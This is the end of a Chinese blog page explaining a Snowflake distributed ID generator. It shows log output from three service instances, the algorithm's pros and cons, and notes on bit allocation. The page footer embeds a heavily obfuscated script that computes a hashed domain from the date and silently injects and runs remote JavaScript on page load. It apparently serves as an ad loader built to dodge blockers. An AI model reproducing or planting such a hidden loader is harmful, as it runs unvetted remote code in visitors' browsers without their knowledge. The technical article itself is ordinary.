2021-11-17 17:38:54 173 [http-nio-6061-exec-10] INFO generateId 27:获取到的分布式id:2440808830111752
2021-11-17 17:38:54 173 [http-nio-6061-exec-15] INFO generateId 27:获取到的分布式id:2440808830111753
2021-11-17 17:38:54 173 [http-nio-6061-exec-50] INFO generateId 27:获取到的分布式id:2440808830111754
2021-11-17 17:38:54 173 [http-nio-6061-exec-46] INFO generateId 27:获取到的分布式id:2440808830111756
2021-11-17 17:38:54 173 [http-nio-6061-exec-23] INFO generateId 27:获取到的分布式id:2440808830111755
2021-11-17 17:38:54 173 [http-nio-6061-exec-6] INFO generateId 27:获取到的分布式id:2440808830111757
2021-11-17 17:38:54 173 [http-nio-6061-exec-21] INFO generateId 27:获取到的分布式id:2440808830111759
2021-11-17 17:38:54 173 [http-nio-6061-exec-42] INFO generateId 27:获取到的分布式id:2440808830111758
2021-11-17 17:38:54 173 [http-nio-6061-exec-45] INFO generateId 27:获取到的分布式id:2440808830111760
2021-11-17 17:38:54 174 [http-nio-6061-exec-47] INFO generateId 27:获取到的分布式id:2440808834306049
2021-11-17 17:38:54 174 [http-nio-6061-exec-33] INFO generateId 27:获取到的分布式id:2440808834306050
2021-11-17 17:38:54 174 [http-nio-6061-exec-25] INFO generateId 27:获取到的分布式id:2440808834306051
2021-11-17 17:38:54 174 [http-nio-6061-exec-5] INFO generateId 27:获取到的分布式id:2440808834306052
2021-11-17 17:38:54 174 [http-nio-6061-exec-32] INFO generateId 27:获取到的分布式id:2440808834306048
2021-11-17 17:38:54 174 [http-nio-6061-exec-30] INFO generateId 27:获取到的分布式id:2440808834306053
2021-11-17 17:38:54 174 [http-nio-6061-exec-14] INFO generateId 27:获取到的分布式id:2440808834306054
</code></pre> 
<p>端口为6062实例的结果：</p> 
<pre><code>2021-11-17 17:38:54 195 [http-nio-6062-exec-50] INFO generateId 27:获取到的分布式id:2440808922390531
2021-11-17 17:38:54 195 [http-nio-6062-exec-40] INFO generateId 27:获取到的分布式id:2440808922390533
2021-11-17 17:38:54 196 [http-nio-6062-exec-45] INFO generateId 27:获取到的分布式id:2440808926584834
2021-11-17 17:38:54 196 [http-nio-6062-exec-34] INFO generateId 27:获取到的分布式id:2440808926584835
2021-11-17 17:38:54 195 [http-nio-6062-exec-8] INFO generateId 27:获取到的分布式id:2440808922390529
2021-11-17 17:38:54 196 [http-nio-6062-exec-37] INFO generateId 27:获取到的分布式id:2440808926584832
2021-11-17 17:38:54 195 [http-nio-6062-exec-21] INFO generateId 27:获取到的分布式id:2440808922390530
2021-11-17 17:38:54 195 [http-nio-6062-exec-41] INFO generateId 27:获取到的分布式id:2440808922390532
2021-11-17 17:38:54 195 [http-nio-6062-exec-18] INFO generateId 27:获取到的分布式id:2440808922390528
2021-11-17 17:38:54 196 [http-nio-6062-exec-5] INFO generateId 27:获取到的分布式id:2440808926584836
2021-11-17 17:38:54 196 [http-nio-6062-exec-35] INFO generateId 27:获取到的分布式id:2440808926584837
2021-11-17 17:38:54 196 [http-nio-6062-exec-12] INFO generateId 27:获取到的分布式id:2440808926584838
2021-11-17 17:38:54 196 [http-nio-6062-exec-39] INFO generateId 27:获取到的分布式id:2440808926584840
2021-11-17 17:38:54 196 [http-nio-6062-exec-22] INFO generateId 27:获取到的分布式id:2440808926584839
2021-11-17 17:38:54 196 [http-nio-6062-exec-14] INFO generateId 27:获取到的分布式id:2440808926584833
2021-11-17 17:38:54 199 [http-nio-6062-exec-6] INFO generateId 27:获取到的分布式id:2440808939167744
2021-11-17 17:38:54 197 [http-nio-6062-exec-17] INFO generateId 27:获取到的分布式id:2440808930779136
2021-11-17 17:38:54 199 [http-nio-6062-exec-25] INFO generateId 27:获取到的分布式id:2440808939167745
2021-11-17 17:38:54 199 [http-nio-6062-exec-24] INFO generateId 27:获取到的分布式id:2440808939167746
2021-11-17 17:38:54 200 [http-nio-6062-exec-4] INFO generateId 27:获取到的分布式id:2440808943362048
2021-11-17 17:38:54 200 [http-nio-6062-exec-3] INFO generateId 27:获取到的分布式id:2440808943362050
2021-11-17 17:38:54 200 [http-nio-6062-exec-23] INFO generateId 27:获取到的分布式id:2440808943362049
2021-11-17 17:38:54 200 [http-nio-6062-exec-9] INFO generateId 27:获取到的分布式id:2440808943362051
2021-11-17 17:38:54 200 [http-nio-6062-exec-48] INFO generateId 27:获取到的分布式id:2440808943362052
2021-11-17 17:38:54 200 [http-nio-6062-exec-29] INFO generateId 27:获取到的分布式id:2440808943362054
2021-11-17 17:38:54 200 [http-nio-6062-exec-16] INFO generateId 27:获取到的分布式id:2440808943362055
2021-11-17 17:38:54 201 [http-nio-6062-exec-1] INFO generateId 27:获取到的分布式id:2440808947556352
2021-11-17 17:38:54 200 [http-nio-6062-exec-20] INFO generateId 27:获取到的分布式id:2440808943362056
2021-11-17 17:38:54 200 [http-nio-6062-exec-28] INFO generateId 27:获取到的分布式id:2440808943362053
2021-11-17 17:38:54 201 [http-nio-6062-exec-30] INFO generateId 27:获取到的分布式id:2440808947556353
2021-11-17 17:38:54 201 [http-nio-6062-exec-31] INFO generateId 27:获取到的分布式id:2440808947556354
2021-11-17 17:38:54 201 [http-nio-6062-exec-27] INFO generateId 27:获取到的分布式id:2440808947556355
2021-11-17 17:38:54 201 [http-nio-6062-exec-46] INFO generateId 27:获取到的分布式id:2440808947556356
2021-11-17 17:38:54 201 [http-nio-6062-exec-44] INFO generateId 27:获取到的分布式id:2440808947556357
2021-11-17 17:38:54 201 [http-nio-6062-exec-33] INFO generateId 27:获取到的分布式id:2440808947556358
2021-11-17 17:38:54 201 [http-nio-6062-exec-36] INFO generateId 27:获取到的分布式id:2440808947556359
2021-11-17 17:38:54 201 [http-nio-6062-exec-26] INFO generateId 27:获取到的分布式id:2440808947556361
2021-11-17 17:38:54 201 [http-nio-6062-exec-43] INFO generateId 27:获取到的分布式id:2440808947556362
2021-11-17 17:38:54 201 [http-nio-6062-exec-32] INFO generateId 27:获取到的分布式id:2440808947556360
2021-11-17 17:38:54 202 [http-nio-6062-exec-7] INFO generateId 27:获取到的分布式id:2440808951750656
2021-11-17 17:38:54 202 [http-nio-6062-exec-19] INFO generateId 27:获取到的分布式id:2440808951750657
2021-11-17 17:38:54 202 [http-nio-6062-exec-38] INFO generateId 27:获取到的分布式id:2440808951750658
2021-11-17 17:38:54 202 [http-nio-6062-exec-13] INFO generateId 27:获取到的分布式id:2440808951750659
2021-11-17 17:38:54 203 [http-nio-6062-exec-42] INFO generateId 27:获取到的分布式id:2440808955944960
2021-11-17 17:38:54 203 [http-nio-6062-exec-49] INFO generateId 27:获取到的分布式id:2440808955944961
2021-11-17 17:38:54 203 [http-nio-6062-exec-2] INFO generateId 27:获取到的分布式id:2440808955944962
2021-11-17 17:38:54 204 [http-nio-6062-exec-15] INFO generateId 27:获取到的分布式id:2440808960139264
2021-11-17 17:38:54 205 [http-nio-6062-exec-10] INFO generateId 27:获取到的分布式id:2440808964333568
2021-11-17 17:38:54 205 [http-nio-6062-exec-47] INFO generateId 27:获取到的分布式id:2440808964333569
2021-11-17 17:38:54 205 [http-nio-6062-exec-11] INFO generateId 27:获取到的分布式id:2440808964333570
</code></pre> 
<p>端口为6063实例的结果：</p> 
<pre><code>2021-11-17 17:38:54 167 [http-nio-6063-exec-17] INFO generateId 27:获取到的分布式id:2440808804954129
2021-11-17 17:38:54 167 [http-nio-6063-exec-5] INFO generateId 27:获取到的分布式id:2440808804954120
2021-11-17 17:38:54 168 [http-nio-6063-exec-33] INFO generateId 27:获取到的分布式id:2440808809148416
2021-11-17 17:38:54 168 [http-nio-6063-exec-25] INFO generateId 27:获取到的分布式id:2440808809148422
2021-11-17 17:38:54 167 [http-nio-6063-exec-46] INFO generateId 27:获取到的分布式id:2440808804954124
2021-11-17 17:38:54 167 [http-nio-6063-exec-30] INFO generateId 27:获取到的分布式id:2440808804954116
2021-11-17 17:38:54 168 [http-nio-6063-exec-48] INFO generateId 27:获取到的分布式id:2440808809148423
2021-11-17 17:38:54 168 [http-nio-6063-exec-8] INFO generateId 27:获取到的分布式id:2440808809148425
2021-11-17 17:38:54 167 [http-nio-6063-exec-38] INFO generateId 27:获取到的分布式id:2440808804954126
2021-11-17 17:38:54 168 [http-nio-6063-exec-44] INFO generateId 27:获取到的分布式id:2440808809148427
2021-11-17 17:38:54 168 [http-nio-6063-exec-29] INFO generateId 27:获取到的分布式id:2440808809148428
2021-11-17 17:38:54 167 [http-nio-6063-exec-47] INFO generateId 27:获取到的分布式id:2440808804954118
2021-11-17 17:38:54 168 [http-nio-6063-exec-11] INFO generateId 27:获取到的分布式id:2440808809148430
2021-11-17 17:38:54 167 [http-nio-6063-exec-32] INFO generateId 27:获取到的分布式id:2440808804954123
2021-11-17 17:38:54 167 [http-nio-6063-exec-20] INFO generateId 27:获取到的分布式id:2440808804954130
2021-11-17 17:38:54 168 [http-nio-6063-exec-13] INFO generateId 27:获取到的分布式id:2440808809148420
2021-11-17 17:38:54 168 [http-nio-6063-exec-45] INFO generateId 27:获取到的分布式id:2440808809148418
2021-11-17 17:38:54 167 [http-nio-6063-exec-39] INFO generateId 27:获取到的分布式id:2440808804954122
2021-11-17 17:38:54 167 [http-nio-6063-exec-35] INFO generateId 27:获取到的分布式id:2440808804954115
2021-11-17 17:38:54 168 [http-nio-6063-exec-9] INFO generateId 27:获取到的分布式id:2440808809148421
2021-11-17 17:38:54 167 [http-nio-6063-exec-16] INFO generateId 27:获取到的分布式id:2440808804954125
2021-11-17 17:38:54 167 [http-nio-6063-exec-34] INFO generateId 27:获取到的分布式id:2440808804954127
2021-11-17 17:38:54 169 [http-nio-6063-exec-10] INFO generateId 27:获取到的分布式id:2440808813342721
2021-11-17 17:38:54 167 [http-nio-6063-exec-36] INFO generateId 27:获取到的分布式id:2440808804954114
2021-11-17 17:38:54 167 [http-nio-6063-exec-28] INFO generateId 27:获取到的分布式id:2440808804954121
2021-11-17 17:38:54 167 [http-nio-6063-exec-4] INFO generateId 27:获取到的分布式id:2440808804954117
2021-11-17 17:38:54 167 [http-nio-6063-exec-24] INFO generateId 27:获取到的分布式id:2440808804954128
2021-11-17 17:38:54 167 [http-nio-6063-exec-41] INFO generateId 27:获取到的分布式id:2440808804954119
2021-11-17 17:38:54 167 [http-nio-6063-exec-22] INFO generateId 27:获取到的分布式id:2440808804954113
2021-11-17 17:38:54 169 [http-nio-6063-exec-40] INFO generateId 27:获取到的分布式id:2440808813342720
2021-11-17 17:38:54 168 [http-nio-6063-exec-19] INFO generateId 27:获取到的分布式id:2440808809148429
2021-11-17 17:38:54 169 [http-nio-6063-exec-43] INFO generateId 27:获取到的分布式id:2440808813342723
2021-11-17 17:38:54 170 [http-nio-6063-exec-12] INFO generateId 27:获取到的分布式id:2440808817537025
2021-11-17 17:38:54 170 [http-nio-6063-exec-6] INFO generateId 27:获取到的分布式id:2440808817537026
2021-11-17 17:38:54 169 [http-nio-6063-exec-15] INFO generateId 27:获取到的分布式id:2440808813342722
2021-11-17 17:38:54 168 [http-nio-6063-exec-26] INFO generateId 27:获取到的分布式id:2440808809148426
2021-11-17 17:38:54 170 [http-nio-6063-exec-2] INFO generateId 27:获取到的分布式id:2440808817537024
2021-11-17 17:38:54 170 [http-nio-6063-exec-50] INFO generateId 27:获取到的分布式id:2440808817537027
2021-11-17 17:38:54 167 [http-nio-6063-exec-23] INFO generateId 27:获取到的分布式id:2440808804954112
2021-11-17 17:38:54 170 [http-nio-6063-exec-27] INFO generateId 27:获取到的分布式id:2440808817537028
2021-11-17 17:38:54 168 [http-nio-6063-exec-1] INFO generateId 27:获取到的分布式id:2440808809148424
2021-11-17 17:38:54 168 [http-nio-6063-exec-18] INFO generateId 27:获取到的分布式id:2440808809148419
2021-11-17 17:38:54 168 [http-nio-6063-exec-37] INFO generateId 27:获取到的分布式id:2440808809148417
2021-11-17 17:38:54 170 [http-nio-6063-exec-21] INFO generateId 27:获取到的分布式id:2440808817537029
2021-11-17 17:38:54 171 [http-nio-6063-exec-7] INFO generateId 27:获取到的分布式id:2440808821731328
2021-11-17 17:38:54 171 [http-nio-6063-exec-42] INFO generateId 27:获取到的分布式id:2440808821731329
2021-11-17 17:38:54 171 [http-nio-6063-exec-14] INFO generateId 27:获取到的分布式id:2440808821731330
2021-11-17 17:38:54 171 [http-nio-6063-exec-3] INFO generateId 27:获取到的分布式id:2440808821731331
2021-11-17 17:38:54 171 [http-nio-6063-exec-49] INFO generateId 27:获取到的分布式id:2440808821731332
2021-11-17 17:38:54 171 [http-nio-6063-exec-31] INFO generateId 27:获取到的分布式id:2440808821731333
</code></pre> 
<h2>
<a id="Snowflake_919"></a>六、Snowflake优缺点</h2> 
<h3>
<a id="61_920"></a>6.1、优点</h3> 
<ul>
<li>ID在内存生成，不依赖于数据库，高性能高可用。</li>
<li>每秒可生成几百万ID，容量大</li>
<li>由于ID呈趋势递增，插入数据库后，使用索引的时候性能较高。</li>
</ul> 
<h3>
<a id="62_924"></a>6.2、缺点</h3> 
<ul>
<li>依赖于系统时钟的一致性，如果某台机器的系统时钟回拨，有可能造成ID冲突或者ID乱序。</li>
<li>同一台机器的系统时间回拨过，那么有可能出现ID重复的情况</li>
</ul> 
<h2>
<a id="_928"></a>结语</h2> 
<p>  其实在这里大家也看到了我们在使用snowflake的一个局限性，一个是数据中心只有32，机器位也只有32，当然大家可以扩展，实际上机器位32对于绝大大部分公司来说足够了，只是数据中心可能会不够，那么就向时间戳那里借几位，比如你借两位就可以支持128了，当然相应的时间戳可用时间也缩短成（<font color="#FF0000"> (1L &lt;&lt; 39) / (1000L * 60 * 60 * 24 * 365)=17年</font>），大家根据需求自行选择。<br>   还有一个就是实际使用这个workerId时其实不是很好维护，当然如果有用到数据库或者redis那维护就更容易了，为了不把本文搞复杂，本文就这么写，大家就参考下实现的思路吧，不管怎么样，本服务不管是单台机器部署多个，还是不同机器部署多个都不会有问题，包括单机，分布式，容器环境，当然有兴趣的小伙伴可以使用美团的<font color="#FF0000"> leaf-Snowflake</font>。</p>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>